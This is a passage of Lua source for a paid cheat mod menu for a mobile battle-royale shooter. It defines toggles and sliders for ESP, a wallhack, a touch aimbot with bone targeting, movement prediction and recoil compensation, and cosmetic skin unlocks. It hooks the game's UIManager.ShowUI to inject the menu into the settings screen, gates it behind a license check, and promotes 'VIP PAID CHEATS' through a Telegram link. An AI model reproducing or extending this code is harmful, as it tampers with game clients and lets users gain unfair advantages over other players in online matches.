    GetFunc = function() return (_G.YourSeller_Config.ESP_LINE or 0) == 1 end,
    SetFunc = function(c, v)
        _G.__ModMenuTouched = true
        _G.YourSeller_Config.ESP_LINE = v and 1 or 0
        if _G.AK_Features then
            for _, f in ipairs(_G.AK_Features) do
                if f.id == "ESP_LINE" then f.val = _G.YourSeller_Config.ESP_LINE end
            end
        end
        return true
    end
    },
    {
    Key = "ModMenu_ESP_COUNT", UI = AliasMap.Switcher,
    Text = "Enemy Counter",
    GetFunc = function() return (_G.YourSeller_Config.ENEMY_COUNT or 0) == 1 end,
    SetFunc = function(c, v)
        _G.__ModMenuTouched = true
        _G.YourSeller_Config.ENEMY_COUNT = v and 1 or 0
        if _G.AK_Features then
            for _, f in ipairs(_G.AK_Features) do
                if f.id == "ENEMY_COUNT" then f.val = _G.YourSeller_Config.ENEMY_COUNT end
            end
        end
        return true
    end
    },
    {
    Key = "ModMenu_ESP_MAP", UI = AliasMap.Switcher,
    Text = "Mini Map ESP",
    GetFunc = function() return (_G.YourSeller_Config.ESP_MAP or 0) == 1 end,
    SetFunc = function(c, v)
        _G.__ModMenuTouched = true
        _G.YourSeller_Config.ESP_MAP = v and 1 or 0
        if _G.AK_Features then
            for _, f in ipairs(_G.AK_Features) do
                if f.id == "ESP_MAP" then f.val = _G.YourSeller_Config.ESP_MAP end
            end
        end
        return true
    end
    },
    {
    Key = "ModMenu_ESP_WALL", UI = AliasMap.Switcher,
    Text = "Wallhack",
    GetFunc = function() return (_G.YourSeller_Config.ESP_WALLHACK or 0) == 1 end,
    SetFunc = function(c, v)
        _G.__ModMenuTouched = true
        _G.YourSeller_Config.ESP_WALLHACK = v and 1 or 0
        if _G.AK_Features then
            for _, f in ipairs(_G.AK_Features) do
                if f.id == "ESP_WALLHACK" then f.val = _G.YourSeller_Config.ESP_WALLHACK end
            end
        end
        return true
    end
    },
}
    
    
        local StackAimbot = {
            {
            Key = "ModMenu_AT_Ex", UI = AliasMap.TitleSwitcher,
            Text = "▶ Enable Touch Aimbot",
            ExpandIndex = 0,
            GetFunc = function()
            return _G.YourSellerConfig.AimTouchEnable end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.AimTouchEnable = v
            return true end
            },
            
            -- HIPFIRE
            {
            Key = "ModMenu_AT_Hip_Ex", UI = AliasMap.TitleSwitcher, Text = "   ▶ Aimbot",
            ExpandHandle = "ModMenu_AT_Ex",
            ExpandIndex = 0,
            GetFunc = function()
            return _G.YourSellerConfig.AimTouchHipfire end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.AimTouchHipfire = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_Hip_IgKnock", UI = AliasMap.Switcher,
            Text = "Ignore Knocked Enemies",
            ExpandHandle = "ModMenu_AT_Hip_Ex",
            GetFunc = function()
            return _G.YourSellerConfig.AimTouchHipIgKnock end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.AimTouchHipIgKnock = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_Hip_IgBot", UI = AliasMap.Switcher,
            Text = "Ignore Bots",
            ExpandHandle = "ModMenu_AT_Hip_Ex",
            GetFunc = function()
            return _G.YourSellerConfig.AimTouchHipIgBot end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.AimTouchHipIgBot = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_Hip_Vis", UI = AliasMap.Switcher,
            Text = "Check Visibility (VisCheck)",
            ExpandHandle = "ModMenu_AT_Hip_Ex",
            GetFunc = function()
            return _G.YourSellerConfig.AimTouchHipVisCheck end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.AimTouchHipVisCheck = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_Hip_Prio", UI = AliasMap.Slider,
            Text = "Priority (1:Crosshair 2:Distance 3:HP 4:HP%)",
            ExpandHandle = "ModMenu_AT_Hip_Ex",
            MinValue = 1, MaxValue = 4, min = 1, max = 4, Min = 1, Max = 4,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchHipPrio or 1 end,
            SetFunc = function(c,v)
            local val = math.floor(v+0.5); if val < 1 then val = 1 end; if val > 4 then val = 4 end; _G.YourSeller.CustomTextData.AimTouchHipPrio = val
            return true end
            },
            
            {
            Key = "ModMenu_AT_Hip_Bone", UI = AliasMap.Slider,
            Text = "Target Bone (1:Head 2:Chest 3:Stomach 4:Waist)",
            ExpandHandle = "ModMenu_AT_Hip_Ex",
            MinValue = 1, MaxValue = 4, min = 1, max = 4, Min = 1, Max = 4,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchHipBone or 1 end,
            SetFunc = function(c,v)
            local val = math.floor(v+0.5);
            if val < 1 then val = 1 end; if val > 4 then val = 4 end;
            _G.YourSeller.CustomTextData.AimTouchHipBone = val
            return true end
            },
            
            {
            Key = "ModMenu_AT_Hip_Cond", UI = AliasMap.Slider,
            Text = "Condition (1:Aim on Fire 2:Always Aim)",
            ExpandHandle = "ModMenu_AT_Hip_Ex",
            MinValue = 1, MaxValue = 2, min = 1, max = 2, Min = 1, Max = 2,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchHipCond or 1 end,
            SetFunc = function(c,v)
            local val = math.floor(v+0.5);
            if val < 1 then val = 1 end; if val > 2 then val = 2 end;
            _G.YourSeller.CustomTextData.AimTouchHipCond = val
            return true end
            },
            
            {
            Key = "ModMenu_AT_Hip_Spd", UI = AliasMap.Slider,
            Text = "Speed (1-100)",
            ExpandHandle = "ModMenu_AT_Hip_Ex",
            MinValue = 1, MaxValue = 100, min = 1, max = 100,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchHipSpeed or 50 end,
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.AimTouchHipSpeed = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_Hip_FOV", UI = AliasMap.Slider,
            Text = "FOV (1-100)",
            ExpandHandle = "ModMenu_AT_Hip_Ex",
            MinValue = 1, MaxValue = 100, min = 1, max = 100,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchHipFOV or 30 end,
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.AimTouchHipFOV = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_Hip_Dist", UI = AliasMap.Slider,
            Text = "Max Distance (1-500m)",
            ExpandHandle = "ModMenu_AT_Hip_Ex",
            MinValue = 1, MaxValue = 100, min = 1, max = 100, GetFunc = function() return math.floor((_G.YourSeller.CustomTextData.AimTouchHipDist or 250) / 5) end,
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.AimTouchHipDist = v * 5
            return true end
            },
            
            -- SCOPE ALL
            {
            Key = "ModMenu_AT_ScopeAll_Ex", UI = AliasMap.TitleSwitcher, Text = "   ▶ Scoped Aimbot",
            ExpandHandle = "ModMenu_AT_Ex",
            ExpandIndex = 0,
            GetFunc = function()
            return _G.YourSellerConfig.AimTouchScopeAll end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.AimTouchScopeAll = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_ScopeAll_IgKnock", UI = AliasMap.Switcher,
            Text = "Ignore Knocked Enemies",
            ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
            GetFunc = function()
            return _G.YourSellerConfig.AimTouchScopeIgKnock end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.AimTouchScopeIgKnock = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_ScopeAll_IgBot", UI = AliasMap.Switcher,
            Text = "Ignore Bots",
            ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
            GetFunc = function()
            return _G.YourSellerConfig.AimTouchScopeIgBot end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.AimTouchScopeIgBot = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_ScopeAll_Vis", UI = AliasMap.Switcher,
            Text = "Check Visibility (VisCheck)",
            ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
            GetFunc = function()
            return _G.YourSellerConfig.AimTouchScopeVisCheck end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.AimTouchScopeVisCheck = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_ScopeAll_Prio", UI = AliasMap.Slider,
            Text = "Priority (1:Crosshair 2:Distance 3:HP 4:HP%)",
            ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
            MinValue = 1, MaxValue = 4, min = 1, max = 4, Min = 1, Max = 4,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchScopePrio or 1 end,
            SetFunc = function(c,v)
            local val = math.floor(v+0.5); if val < 1 then val = 1 end; if val > 4 then val = 4 end; _G.YourSeller.CustomTextData.AimTouchScopePrio = val
            return true end
            },
            
            {
            Key = "ModMenu_AT_ScopeAll_Bone", UI = AliasMap.Slider,
            Text = "Target Bone (1:Head 2:Chest 3:Stomach 4:Waist)",
            ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
            MinValue = 1, MaxValue = 4, min = 1, max = 4, Min = 1, Max = 4,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchScopeBone or 2 end,
            SetFunc = function(c,v)
            local val = math.floor(v+0.5); if val < 1 then val = 1 end; if val > 4 then val = 4 end; _G.YourSeller.CustomTextData.AimTouchScopeBone = val
            return true end
            },
            
            {
            Key = "ModMenu_AT_ScopeAll_Cond", UI = AliasMap.Slider,
            Text = "Condition (1:Aim on Fire 2:Always Aim)",
            ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
            MinValue = 1, MaxValue = 2, min = 1, max = 2, Min = 1, Max = 2,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchScopeCond or 1 end,
            SetFunc = function(c,v)
            local val = math.floor(v+0.5); if val < 1 then val = 1 end; if val > 2 then val = 2 end; _G.YourSeller.CustomTextData.AimTouchScopeCond = val
            return true end
            },
            
            {
            Key = "ModMenu_AT_ScopeAll_Spd", UI = AliasMap.Slider,
            Text = "Speed (1-100)",
            ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
            MinValue = 1, MaxValue = 100, min = 1, max = 100,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchScopeSpeed or 40 end,
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.AimTouchScopeSpeed = v
            return true end
            },
            {
            Key = "ModMenu_AT_ScopeAll_FOV", UI = AliasMap.Slider,
            Text = "FOV Radius (1-100)",
            ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
            MinValue = 1, MaxValue = 100, min = 1, max = 100,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchScopeFOV or 20 end,
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.AimTouchScopeFOV = v
            return true end
            },
            {
            Key = "ModMenu_AT_ScopeAll_Dist", UI = AliasMap.Slider,
            Text = "Max Distance (1-500m)",
            ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
            MinValue = 1, MaxValue = 100, min = 1, max = 100, GetFunc = function() return math.floor((_G.YourSeller.CustomTextData.AimTouchScopeDist or 300) / 5) end,
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.AimTouchScopeDist = v * 5
            return true end
            },
            
            {
            Key = "ModMenu_AT_ScopeAll_Pred", UI = AliasMap.Slider,
            Text = "Prediction for Moving Targets",
            ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
            MinValue = 0, MaxValue = 100, min = 0, max = 100,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchScopePred or 0 end,
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.AimTouchScopePred = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_ScopeAll_Recoil", UI = AliasMap.Slider,
            Text = "Auto Recoil Compensation (set ~3%-4% for best effect)",
            ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
            MinValue = 0, MaxValue = 50, min = 0, max = 50,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchScopeRecoil or 0 end,
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.AimTouchScopeRecoil = v
            return true end
            },

            -- SCOPE SNIPER
            {
            Key = "ModMenu_AT_Sniper_Ex", UI = AliasMap.TitleSwitcher, Text = "   ▶ Scoped Aimbot (Snipers/DMR Rifles)",
            ExpandHandle = "ModMenu_AT_Ex",
            ExpandIndex = 0,
            GetFunc = function()
            return _G.YourSellerConfig.AimTouchScopeSniper end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.AimTouchScopeSniper = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_Sniper_IgKnock", UI = AliasMap.Switcher,
            Text = "Ignore Knocked Enemies",
            ExpandHandle = "ModMenu_AT_Sniper_Ex",
            GetFunc = function()
            return _G.YourSellerConfig.AimTouchSniperIgKnock end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.AimTouchSniperIgKnock = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_Sniper_IgBot", UI = AliasMap.Switcher,
            Text = "Ignore Bots",
            ExpandHandle = "ModMenu_AT_Sniper_Ex",
            GetFunc = function()
            return _G.YourSellerConfig.AimTouchSniperIgBot end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.AimTouchSniperIgBot = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_Sniper_Vis", UI = AliasMap.Switcher,
            Text = "Check Visibility (VisCheck)",
            ExpandHandle = "ModMenu_AT_Sniper_Ex",
            GetFunc = function()
            return _G.YourSellerConfig.AimTouchSniperVisCheck end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.AimTouchSniperVisCheck = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_Sniper_Prio", UI = AliasMap.Slider,
            Text = "Priority (1:Crosshair 2:Distance 3:HP 4:HP%)",
            ExpandHandle = "ModMenu_AT_Sniper_Ex",
            MinValue = 1, MaxValue = 4, min = 1, max = 4, Min = 1, Max = 4,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchSniperPrio or 1 end,
            SetFunc = function(c,v)
            local val = math.floor(v+0.5); if val < 1 then val = 1 end; if val > 4 then val = 4 end; _G.YourSeller.CustomTextData.AimTouchSniperPrio = val
            return true end
            },
            
            {
            Key = "ModMenu_AT_Sniper_Bone", UI = AliasMap.Slider,
            Text = "Target Bone (1:Head 2:Chest 3:Stomach 4:Waist)",
            ExpandHandle = "ModMenu_AT_Sniper_Ex",
            MinValue = 1, MaxValue = 4, min = 1, max = 4, Min = 1, Max = 4,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchSniperBone or 1 end,
            SetFunc = function(c,v)
            local val = math.floor(v+0.5); if val < 1 then val = 1 end; if val > 4 then val = 4 end; _G.YourSeller.CustomTextData.AimTouchSniperBone = val
            return true end
            },
            
            {
            Key = "ModMenu_AT_Sniper_Cond", UI = AliasMap.Slider,
            Text = "Condition (1:Aim on Fire 2:Always Aim)",
            ExpandHandle = "ModMenu_AT_Sniper_Ex",
            MinValue = 1, MaxValue = 2, min = 1, max = 2, Min = 1, Max = 2,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchSniperCond or 2 end,
            SetFunc = function(c,v)
            local val = math.floor(v+0.5);
            if val < 1 then val = 1 end;
            if val > 2 then val = 2 end;
            _G.YourSeller.CustomTextData.AimTouchSniperCond = val
            return true end
            },
            
            {
            Key = "ModMenu_AT_Sniper_Spd", UI = AliasMap.Slider,
            Text = "Speed (1-100)",
            ExpandHandle = "ModMenu_AT_Sniper_Ex",
            MinValue = 1, MaxValue = 100, min = 1, max = 100,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchSniperSpeed or 30 end,
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.AimTouchSniperSpeed = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_Sniper_FOV", UI = AliasMap.Slider,
            Text = "FOV Radius (1-100)",
            ExpandHandle = "ModMenu_AT_Sniper_Ex",
            MinValue = 1, MaxValue = 100, min = 1, max = 100,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchSniperFOV or 20 end,
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.AimTouchSniperFOV = v
            return true end
            },
            
            {
            Key = "ModMenu_AT_Sniper_Dist", UI = AliasMap.Slider,
            Text = "Max Distance (1-500m)",
            ExpandHandle = "ModMenu_AT_Sniper_Ex",
            MinValue = 1, MaxValue = 100, min = 1, max = 100, GetFunc = function() return math.floor((_G.YourSeller.CustomTextData.AimTouchSniperDist or 400) / 5) end,
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.AimTouchSniperDist = v * 5
            return true end
            },
            
            {
            Key = "ModMenu_AT_Sniper_Pred", UI = AliasMap.Slider,
            Text = "Prediction for Moving Targets",
            ExpandHandle = "ModMenu_AT_Sniper_Ex",
            MinValue = 0, MaxValue = 100, min = 0, max = 100,
            GetFunc = function()
            return _G.YourSeller.CustomTextData.AimTouchSniperPred or 0 end,
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.AimTouchSniperPred = v
            return true end
            }
        }
    
        local StackGraphics = {
            {
            Key = "ModMenu_Ipad", UI = AliasMap.Switcher,
            Text = "IPad View",
            GetFunc = function() return
            _G.YourSellerConfig.IpadView end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.IpadView = v
            return true end
            },
            
            {
            Key = "ModMenu_IPadFov", UI = AliasMap.Slider,
            Text = "Custome IPad-View",
            MinValue = 90, MaxValue = 190, min = 90, max = 190,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.IPadFov or 120
            end,
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.IPadFov = v; _G.YourSellerConfig.IPadFov = v;
            return true end
            },
            
            {
            Key = "ModMenu_fps", UI = AliasMap.Switcher,
            Text = "165Fps",
            GetFunc = function() return
            _G.YourSellerConfig.UnlockFPS end,
            SetFunc = function(c,v)
            _G.YourSellerConfig.UnlockFPS = v
            return true end
            },
        }
        local StackSkin = {
            {
            Key = "ModMenu_ModSkin", UI = AliasMap.TitleSwitcher,
            Text = "▶ Mod Skin",
            ExpandIndex = 0,
            GetFunc = function() return
            _G.YourSellerConfig.ModSkin end, SetFunc = function(c,v) _G.YourSellerConfig.ModSkin = v return true end },
            
            {
            Key = "ModMenu_Skin_Suit", UI = AliasMap.Slider,
            Text = "Suits Skin", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 80,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinSuit or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinSuit = v; if _G.OutfitSkins and _G.OutfitSkins.Suit[v] then _G.OutfitMap.Suit = _G.OutfitSkins.Suit[v]
            end return true
            end
            },
            {
            Key = "ModMenu_Skin_Bag", UI = AliasMap.Slider,
            Text = "Bag Skin", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 15,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinBag or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinBag = v; if _G.OutfitSkins and _G.OutfitSkins.Bag[v] then _G.OutfitMap.Bag = _G.OutfitSkins.Bag[v]
            end return true
            end
            },
            {
            Key = "ModMenu_Skin_Helmet", UI = AliasMap.Slider,
            Text = "Helmet Skin", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 11,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinHelmet or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinHelmet = v; if _G.OutfitSkins and _G.OutfitSkins.Helmet[v] then _G.OutfitMap.Helmet = _G.OutfitSkins.Helmet[v]
            end return true
            end
            },

            {
            Key = "ModMenu_Skin_M416", UI = AliasMap.Slider,
            Text = "M416", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 8,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinM416 or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinM416 = v;
            if _G.skinIdMappings[101004] and _G.skinIdMappings[101004][v] then
            _G.WeaponSkinMap[101004] = _G.skinIdMappings[101004][v]
            end return true
            end
            },
            
            {
            Key = "ModMenu_Skin_AKM", UI = AliasMap.Slider,
            Text = "AKM", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 8,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinAKM or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinAKM = v;
            if _G.skinIdMappings[101001] and _G.skinIdMappings[101001][v] then
            _G.WeaponSkinMap[101001] = _G.skinIdMappings[101001][v]
            end return true
            end
            },
            
            {
            Key = "ModMenu_Skin_SCAR", UI = AliasMap.Slider,
            Text = "SCAR-L", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 8,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinSCAR or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinSCAR = v;
            if _G.skinIdMappings[101003] and _G.skinIdMappings[101003][v] then
            _G.WeaponSkinMap[101003] = _G.skinIdMappings[101003][v]
            end return true
            end
            },
            
            {
            Key = "ModMenu_Skin_M762", UI = AliasMap.Slider,
            Text = "M762", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 8,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinM762 or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinM762 = v;
            if _G.skinIdMappings[101008] and _G.skinIdMappings[101008][v] then
            _G.WeaponSkinMap[101008] = _G.skinIdMappings[101008][v]
            end return true
            end
            },
            
            {
            Key = "ModMenu_Skin_AUG", UI = AliasMap.Slider,
            Text = "AUG", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 7,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinAUG or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinAUG = v;
            if _G.skinIdMappings[101006] and _G.skinIdMappings[101006][v] then
            _G.WeaponSkinMap[101006] = _G.skinIdMappings[101006][v]
            end return true
            end
            },
            
            {
            Key = "ModMenu_Skin_UMP", UI = AliasMap.Slider,
            Text = "UMP45", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 5,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinUMP or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinUMP = v;
            if _G.skinIdMappings[102002] and _G.skinIdMappings[102002][v] then
            _G.WeaponSkinMap[102002] = _G.skinIdMappings[102002][v]
            end return true
            end
            },
            
            {
            Key = "ModMenu_Skin_UZI", UI = AliasMap.Slider,
            Text = "UZI", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 2,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinUZI or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinUZI = v;
            if _G.skinIdMappings[102001] and _G.skinIdMappings[102001][v] then
            _G.WeaponSkinMap[102001] = _G.skinIdMappings[102001][v]
            end return true
            end
            },
            
            {
            Key = "ModMenu_Skin_Groza", UI = AliasMap.Slider,
            Text = "Groza", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 2,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinGroza or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinGroza = v;
            if _G.skinIdMappings[101005] and _G.skinIdMappings[101005][v] then
            _G.WeaponSkinMap[101005] = _G.skinIdMappings[101005][v]
            end return true
            end
            },
            
            {
            Key = "ModMenu_Skin_S12K", UI = AliasMap.Slider,
            Text = "S12K", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 2,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinS12K or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinS12K = v;
            if _G.skinIdMappings[104003] and _G.skinIdMappings[104003][v] then
            _G.WeaponSkinMap[104003] = _G.skinIdMappings[104003][v]
            end return true
            end
            },
            
            {
            Key = "ModMenu_Skin_DBS", UI = AliasMap.Slider,
            Text = "DBS", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 3,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinDBS or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinDBS = v;
            if _G.skinIdMappings[104004] and _G.skinIdMappings[104004][v] then
            _G.WeaponSkinMap[104004] = _G.skinIdMappings[104004][v]
            end return true
            end
            },

            {
            Key = "ModMenu_Skin_Dacia", UI = AliasMap.Slider,
            Text = "Dacia Skin", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 90,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinDacia or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinDacia = v;
            if _G.VehicleSkins[1903001] and _G.VehicleSkins[1903001][v] then
            _G.VehicleSkinMap[1903001] = _G.VehicleSkins[1903001][v]
            end return true
            end
            },
            
            {
            Key = "ModMenu_Skin_UAZ", UI = AliasMap.Slider,
            Text = "UAZ Skin", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 90,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinUAZ or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinUAZ = v;
            if _G.VehicleSkins[1908001] and _G.VehicleSkins[1908001][v] then
            _G.VehicleSkinMap[1908001] = _G.VehicleSkins[1908001][v]
            end return true
            end
            },
            
            {
            Key = "ModMenu_Skin_Coupe", UI = AliasMap.Slider,
            Text = "Coupe Skin", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 70,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinCoupe or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinCoupe = v;
            if _G.VehicleSkins[1961001] and _G.VehicleSkins[1961001][v] then
            _G.VehicleSkinMap[1961001] = _G.VehicleSkins[1961001][v]
            end return true
            end
            },
            
            {
            Key = "ModMenu_Skin_Buggy", UI = AliasMap.Slider,
            Text = "Buggy Skin", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 50,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinBuggy or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinBuggy = v;
            if _G.VehicleSkins[1907001] and _G.VehicleSkins[1907001][v] then
            _G.VehicleSkinMap[1907001] = _G.VehicleSkins[1907001][v]
            end return true
            end
            },
            
            {
            Key = "ModMenu_Skin_Mirado", UI = AliasMap.Slider,
            Text = "Mirado Skin", ExpandHandle = "ModMenu_ModSkin", MinValue = 1, MaxValue = 27,
            GetFunc = function() return
            _G.YourSeller.CustomTextData.SkinMirado or 1
            end, 
            SetFunc = function(c,v)
            _G.YourSeller.CustomTextData.SkinMirado = v;
            if _G.VehicleSkins[1915001] and _G.VehicleSkins[1915001][v] then
            _G.VehicleSkinMap[1915001] = _G.VehicleSkins[1915001][v]
            end return true
            end
            }
        }
        
        SettingPageDefine.YourSellerMenu = {
            Key = "YourSellerMenu",
            Text = 999000,
            UIKey = "Setting_Page_Privacy",
            Category = {
                { Key = "Cat_ESP", Text = 999003, Stack = StackESP },
                { Key = "Cat_Aimbot", Text = 999002, Stack = StackAimbot },
                { Key = "Cat_Graphics", Text = 999004, Stack = StackGraphics },
                { Key = "Cat_Skin", Text = 999005, Stack = StackSkin }
            }
        }
        table.insert(SettingCatalog, 1, SettingPageDefine.YourSellerMenu)
    end

    local UIManager = _G.UIManager
if UIManager and not UIManager._IsModMenuHooked then
    local old_ShowUI = UIManager.ShowUI
    UIManager.ShowUI = function(config, ...)
        local args = {...}
        local n = select('#', ...)
        if config and config.keyName then
            local lowerKeyName = string.lower(config.keyName)
            if string.find(lowerKeyName, "setting_main") and not string.find(lowerKeyName, "custom") then
                local catalog = args[1]
                if type(catalog) == "table" and catalog[1] and type(catalog[1]) == "table" and catalog[1].Key then
                    local hasModMenu = false
                    for _, page in ipairs(catalog) do
                        if type(page) == "table" and page.Key == "YourSellerMenu" then
                            hasModMenu = true
                            break
                        end
                    end
                    if not hasModMenu then
                        table.insert(catalog, 1, SettingPageDefine.YourSellerMenu)
                    end
                end
            end
        end
        local table_unpack = table.unpack or unpack
        return old_ShowUI(config, table_unpack(args, 1, n))
    end
    UIManager._IsModMenuHooked = true
    end
end

local function ShowModMenu()
    if _G.MenuAlreadyShown then return end
    if not YourSellerESPLicenseInstance then return end
    local licensed = false
    pcall(function() licensed = YourSellerESPLicenseInstance:isActive() == true end)
    if not licensed then return end
    pcall(function()
        local function open_telegram()
        import("KismetSystemLibrary").LaunchURL("https://t.me/YourSeller")
        end
        local Msg = require("client.slua.logic.common.logic_common_msg_box")
        if Msg and Msg.Show then
            Msg.Show(4, "VIP PAID CHEATS LUA MOD", "VIP PAID CHEATS\n\nEsp ★\nSdk ★\nSkins ★\n\nMust Join Telegram",
            function() end,
            function() open_telegram() end,
            "Ok", "Telegram")
            _G.MenuAlreadyShown = true
        end
    end)
end


-- ============================================================================
-- 7. ESP BOX RENDERER  (0.02s timer) — HP + Distance + Head Line + Counter
-- ============================================================================
local ESPBoxRenderer = (function()
    local M = {}
    local FVector2D    = _G.FVector2D or import("Vector2D")
    local FLinearColor = _G.FLinearColor or import("LinearColor")
    local SlateBlueprintLibrary = nil
    local WidgetLayoutLibrary   = nil
    pcall(function() SlateBlueprintLibrary = import("SlateBlueprintLibrary") end)
    pcall(function() WidgetLayoutLibrary   = import("WidgetLayoutLibrary")   end)

